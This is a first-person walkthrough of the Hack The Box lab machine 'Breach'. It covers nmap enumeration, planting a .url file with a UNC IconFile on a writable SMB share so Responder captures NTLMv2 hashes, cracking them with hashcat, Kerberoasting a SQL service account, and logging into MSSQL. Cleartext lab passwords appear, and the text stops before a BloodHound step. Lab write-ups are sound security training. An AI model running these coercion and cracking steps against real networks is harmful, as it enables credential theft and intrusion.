Target : 10.129.2.189

Date : 24/06/2026

Only information given in Adventure Mode (Black Box mode in HTB) : 'The User flag for this Box is located in a non-standard directory, C:\share\transfer.'

```bash
>  echo "10.129.2.189 breach.htb" | sudo tee /etc/hosts  
10.129.2.189 breach.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=2500 10.129.2.189  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-24 14:22 +0200  
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 47.99% done; ETC: 14:23 (0:00:28 remaining)  
Nmap scan report for breach.htb (10.129.2.189)  
Host is up (0.064s latency).  
Not shown: 65514 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
|_http-title: IIS Windows Server  
|_http-server-header: Microsoft-IIS/10.0  
| http-methods:    
|_  Potentially risky methods: TRACE  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-24 12:24:31Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM  
|_ssl-date: 2026-05-24T12:26:10+00:00; 0s from scanner time.  
| ms-sql-info:    
|   10.129.2.189:1433:    
|     Version:    
|       name: Microsoft SQL Server 2019 RTM  
|       number: 15.00.2000.00  
|       Product: Microsoft SQL Server 2019  
|       Service pack level: RTM  
|       Post-SP patches applied: false  
|_    TCP port: 1433  
| ms-sql-ntlm-info:    
|   10.129.2.189:1433:    
|     Target_Name: BREACH  
|     NetBIOS_Domain_Name: BREACH  
|     NetBIOS_Computer_Name: BREACHDC  
|     DNS_Domain_Name: breach.vl  
|     DNS_Computer_Name: BREACHDC.breach.vl  
|     DNS_Tree_Name: breach.vl  
|_    Product_Version: 10.0.20348  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2026-05-24T12:20:08  
|_Not valid after:  2056-05-24T12:20:08  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=BREACHDC.breach.vl  
| Not valid before: 2026-05-23T12:17:24  
|_Not valid after:  2026-11-22T12:17:24  
| rdp-ntlm-info:    
|   Target_Name: BREACH  
|   NetBIOS_Domain_Name: BREACH  
|   NetBIOS_Computer_Name: BREACHDC  
|   DNS_Domain_Name: breach.vl  
|   DNS_Computer_Name: BREACHDC.breach.vl  
|   DNS_Tree_Name: breach.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-05-24T12:25:30+00:00  
|_ssl-date: 2026-05-24T12:26:10+00:00; 0s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp  open  mc-nmf        .NET Message Framing  
49664/tcp open  msrpc         Microsoft Windows RPC  
49669/tcp open  msrpc         Microsoft Windows RPC  
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
50020/tcp open  msrpc         Microsoft Windows RPC  
54567/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-05-24T12:25:32  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
```

So, we got a SQL Server on port 1433 `name: Microsoft SQL Server 2019 RTM` with domain names `BREACHDC.breach.vl` and `breach.vl`, target/computer name : `BREACH` ; 
Windows Active Directory LDAP ports 389 and 3268 open, port 53 (DNS) and port 80 (http) open, port 445 smb2 3.1.1 and port 88 (Kerberos) as the main ports. Netbios is also open on port 139 and Windows RPC is open on multiple ports, although one is open through rpc over HTTP 1.0 : `tcp/49677`.

```bash
>  echo "10.129.2.189 BREACHDC.breach.vl breach.vl" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.2.189 BREACHDC.breach.vl breach.vl  
>  smbclient -N -L //10.129.2.189  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       IPC$            IPC       Remote IPC  
       NETLOGON        Disk      Logon server share    
       share           Disk         
       SYSVOL          Disk      Logon server share    
       Users           Disk         
SMB1 disabled -- no workgroup available
```

With such a big attack surface, it'd be easy to fall into rabbit holes. We'll start with SMB but will be cautious.

```bash
>  smbclient -N //10.129.2.189/share -c 'recurse ON; ls transfer\*'  
  
 .                                   D        0  Mon Sep  8 12:13:44 2025  
 ..                                  D        0  Mon Sep  8 13:13:00 2025  
 claire.pope                         D        0  Thu Feb 17 12:21:35 2022  
 diana.pope                          D        0  Thu Feb 17 12:21:19 2022  
 julia.wong                          D        0  Thu Apr 17 02:38:12 2025  
  
\transfer\claire.pope  
NT_STATUS_ACCESS_DENIED listing \transfer\claire.pope\*  
  
\transfer\diana.pope  
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*  
  
\transfer\julia.wong  
NT_STATUS_ACCESS_DENIED listing \transfer\julia.wong\*

>  netexec smb 10.129.2.189 -u '' -p ''  
SMB         10.129.2.189    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.2.189    445    BREACHDC         [+] breach.vl\:

>  printf 'write_test_%s\n' "$(date +%s)" > /tmp/write_test.txt && smbclient -N //10.129.2.189/share -c 'cd transfer; put /tmp/write_test.txt'  
  
NT_STATUS_OBJECT_PATH_NOT_FOUND opening remote file \transfer\tmp\write_test.txt

>  smbclient -L //10.129.2.189 -U%  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
SMB1 disabled -- no workgroup available
```

It seems the SMB access is closed off unless we have credentials.

```bash
>  nxc smb 10.129.2.189 -u guest -p '' --shares  
  
SMB         10.129.2.189    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.2.189    445    BREACHDC         [+] breach.vl\guest:    
SMB         10.129.2.189    445    BREACHDC         [*] Enumerated shares  
SMB         10.129.2.189    445    BREACHDC         Share           Permissions     Remark  
SMB         10.129.2.189    445    BREACHDC         -----           -----------     ------  
SMB         10.129.2.189    445    BREACHDC         ADMIN$                          Remote Admin  
SMB         10.129.2.189    445    BREACHDC         C$                              Default share  
SMB         10.129.2.189    445    BREACHDC         IPC$            READ            Remote IPC  
SMB         10.129.2.189    445    BREACHDC         NETLOGON                        Logon server share    
SMB         10.129.2.189    445    BREACHDC         share           READ,WRITE         
SMB         10.129.2.189    445    BREACHDC         SYSVOL                          Logon server share    
SMB         10.129.2.189    445    BREACHDC         Users           READ
```

We at least got a list of shares, but totally unnaccessible for us, except for `share` which has `READ, WRITE` permissions for user `guest`, and also IPC$ and Users that has `READ` permissions for that user.

```bash
>  printf 'write_test_%s\n' "$(date +%s)" > /tmp/write_test.txt && smbclient -N //10.129.2.189/share -c 'cd transfer; lcd /tmp; put write_test.txt write_test.txt; ls'  
  
putting file write_test.txt as \transfer\write_test.txt (0.1 kB/s) (average 0.1 kB/s)  
 .                                   D        0  Sun May 24 15:12:31 2026  
 ..                                  D        0  Sun May 24 15:09:51 2026  
 claire.pope                         D        0  Thu Feb 17 12:21:35 2022  
 diana.pope                          D        0  Thu Feb 17 12:21:19 2022  
 julia.wong                          D        0  Thu Apr 17 02:38:12 2025  
 write_test.txt                      A       22  Sun May 24 15:12:31 2026  
  
               7863807 blocks of size 4096. 1562240 blocks available
               
smbclient -N //10.129.2.189/share -c 'cd transfer; del write_test.txt; ls'

 .                                   D        0  Sun May 24 15:14:34 2026  
 ..                                  D        0  Sun May 24 15:09:51 2026  
 claire.pope                         D        0  Thu Feb 17 12:21:35 2022  
 diana.pope                          D        0  Thu Feb 17 12:21:19 2022  
 julia.wong                          D        0  Thu Apr 17 02:38:12 2025  
  
               7863807 blocks of size 4096. 1562264 blocks available
```

So we can indeed write into `/share`.

```bash
>  sudo responder -I tun1 -dwv  
  
Please touch the FIDO authenticator.  
                                        __  
 .----.-----.-----.-----.-----.-----.--|  |.-----.----.  
 |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  
 |__| |_____|_____|   __|_____|__|__|_____||_____|__|  
                  |__|  
  
  
[*] Tips jar:  
   USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A  
   BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49  
  
[+] Poisoners:  
   LLMNR                      [ON]  
   NBT-NS                     [ON]  
   MDNS                       [ON]  
   DNS                        [ON]  
   DHCP                       [ON]  
   DHCPv6                     [OFF]  
  
[+] Servers:  
   HTTP server                [ON]  
   HTTPS server               [ON]  
   WPAD proxy                 [ON]  
   Auth proxy                 [OFF]  
   SMB server                 [ON]  
   Kerberos server            [ON]  
   SQL server                 [ON]  
   FTP server                 [ON]  
   IMAP server                [ON]  
   POP3 server                [ON]  
   SMTP server                [ON]  
   DNS server                 [ON]  
   LDAP server                [ON]  
   MQTT server                [ON]  
   RDP server                 [ON]  
   DCE-RPC server             [ON]  
   WinRM server               [ON]  
   SNMP server                [ON]  
  
[+] HTTP Options:  
   Always serving EXE         [OFF]  
   Serving EXE                [OFF]  
   Serving HTML               [OFF]  
   Upstream Proxy             [OFF]  
  
[+] Poisoning Options:  
   Analyze Mode               [OFF]  
   Force WPAD auth            [OFF]  
   Force Basic Auth           [OFF]  
   Force LM downgrade         [OFF]  
   Force ESS downgrade        [OFF]  
  
[+] Generic Options:  
   Responder NIC              [tun1]  
   Responder IP               [10.10.14.12]  
   Responder IPv6             [fe80::ee8e:bd93:cdc3:3a65]  
   Challenge set              [random]  
   Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']  
   Don't Respond To MDNS TLD  ['_DOSVC']  
   TTL for poisoned response  [default]  
  
[+] Current Session Variables:  
   Responder Machine Name     [WIN-8D8QHZ9H2WK]  
   Responder Domain Name      [7KFH.LOCAL]  
   Responder DCE-RPC Port     [45481]  
  
[*] Version: Responder 3.2.2.0  
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>  
  
[+] Listening for events...  
  
[!] Error starting SSL server on port 5986, check permissions or other servers running.  
[!] Error starting SSL server on port 443, check permissions or other servers running.  
[!] Error starting SSL server on port 636, check permissions or other servers running.
```

We can see that Responder can interact with the SMB server. This is maybe a chance to get a vulnerability.

We'll trap the smbclient by making it parse a .url for which Explorer will parse a folder icon, which will get it straight to our responder :

```bash
>  cat > /tmp/scrow.url <<'EOF'  
[InternetShortcut]  
URL=https://hackthebox.com  
IconFile=\\10.10.14.12\share\nonexistent.ico  
IconIndex=1  
EOF 
```

```bash
>  smbclient -N //10.129.2.189/share -c 'cd transfer; lcd /tmp; put scrow.url scrow.url; ls'  
  
putting file scrow.url as \transfer\scrow.url (0.5 kB/s) (average 0.5 kB/s)  
 .                                   D        0  Sun May 24 15:28:10 2026  
 ..                                  D        0  Sun May 24 15:09:51 2026  
 claire.pope                         D        0  Thu Feb 17 12:21:35 2022  
 diana.pope                          D        0  Thu Feb 17 12:21:19 2022  
 julia.wong                          D        0  Thu Apr 17 02:38:12 2025  
 scrow.url                           A      103  Sun May 24 15:28:11 2026  
  
               7863807 blocks of size 4096. 1562049 blocks available
```

And with that, Responder captures the authentication method (which for this version of Windows is NTLMv2-SSP) :

```bash
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
[SMB] NTLMv2-SSP Client   : 10.129.2.189  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : [REDACTED]
```

We take the very last one :

```bash
> nano /tmp/julia_clean.hash
> cat /tmp/julia_clean.hash  
[REDACTED]
[REDACTED]
[REDACTED]
[REDACTED]

>  hashcat -m 5600 /tmp/julia_clean.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (14200 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
[REDACTED]
[REDACTED]
[REDACTED]
[REDACTED]
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 5600 (NetNTLMv2)  
[REDACTED]
Time.Started.....: Sun May 24 15:49:50 2026 (0 secs)  
Time.Estimated...: Sun May 24 15:49:50 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1390.9 kH/s (3.79ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 122880/14344384 (0.86%)  
Rejected.........: 0/122880 (0.00%)  
Restore.Point....: 114688/14344384 (0.80%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: 022579 -> money89  
Hardware.Mon.#01.: Temp: 71c Util: 35%  
  
Started: Sun May 24 15:49:20 2026  
Stopped: Sun May 24 15:49:52 2026
```

Cracked ! `JULIA.WONG:Computer1`

We now get to the /share directory and extract from transfer (where we put the URL and where julia.wong was) the user.txt file, as indicated in the `Adventure Mode` (Black Box Mode on HTB) : "`The User flag for this Box is located in a non-standard directory, C:\share\transfer.`" just before `Submit User Flag` and `Submit Root Flag`.

```bash
>  smbclient //10.129.2.189/share -U 'JULIA.WONG%Computer1' -c 'get transfer\\JULIA.WONG\\user.txt user.txt exit'  
getting file \transfer\JULIA.WONG\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
>  cat user.txt  
[REDACTED]
```

We remove the dirty % and we got the user flag : [REDACTED]

Now, we'll get into Julia Wong's computer, trying to find ways to privesc.

```bash
>  evil-winrm -i 10.129.2.189 -u 'julia.wong' -p 'Computer1'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\> dir  
  
                                          
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError  
                                          
Error: Exiting with code 1  
>
```

That failed spectacularly.

```bash
>  GetUserSPNs.py 'breach.vl/julia.wong:Computer1' -request  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation    
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------  
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 11:43:08.106169  2026-05-24 14:20:04.997550                
  
  
  
[-] CCache file is not found. Skipping...  
[REDACTED]
```

We found `svc_mssql` with a `krb5tgs` hash, hinting for a Kerberos ticket.

From nmap : `1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM`

This might be the way to privesc. So we pivot from local to trying to get access to port 1433.

```bash
>  nano /tmp/svchash.txt
>  hashcat -m 13100 /tmp/svchash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -O  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 31  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 51  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Optimized-Kernel  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (14525 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
[REDACTED]
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
[REDACTED]
Time.Started.....: Sun May 24 16:23:02 2026 (0 secs)  
Time.Estimated...: Sun May 24 16:23:02 2026 (0 secs)  
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1246.6 kH/s (3.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 57345/14344384 (0.40%)  
Rejected.........: 1/57345 (0.00%)  
Restore.Point....: 49153/14344384 (0.34%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: trini1 -> Whitney  
Hardware.Mon.#01.: Temp: 69c Util: 16%  
  
Started: Sun May 24 16:22:35 2026  
Stopped: Sun May 24 16:23:03 2026
```

Cracked ! `svc_mssql:Trustno1`

```bash
>  netexec mssql breachdc.breach.vl -u svc_mssql -p 'Trustno1'  
MSSQL       10.129.2.189    1433   BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl) (EncryptionReq:False)  
MSSQL       10.129.2.189    1433   BREACHDC         [+] breach.vl\svc_mssql:Trustno1

>  mssqlclient.py 'breach.vl/svc_mssql:Trustno1'@BREACHDC.breach.vl -windows-auth  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)  
[!] Press help for extra shell commands  
SQL (BREACH\svc_mssql  guest@master)> SELECT SYSTEM_USER;  
                     
----------------      
BREACH\svc_mssql      
SQL (BREACH\svc_mssql  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');  
      
-      
0      
```

We do not have sysadmin privileges on mssql.

We'll try using bloodhound-python to collect everything (hopefully a ticket) using the local user and the ms-sql domain.

```bash
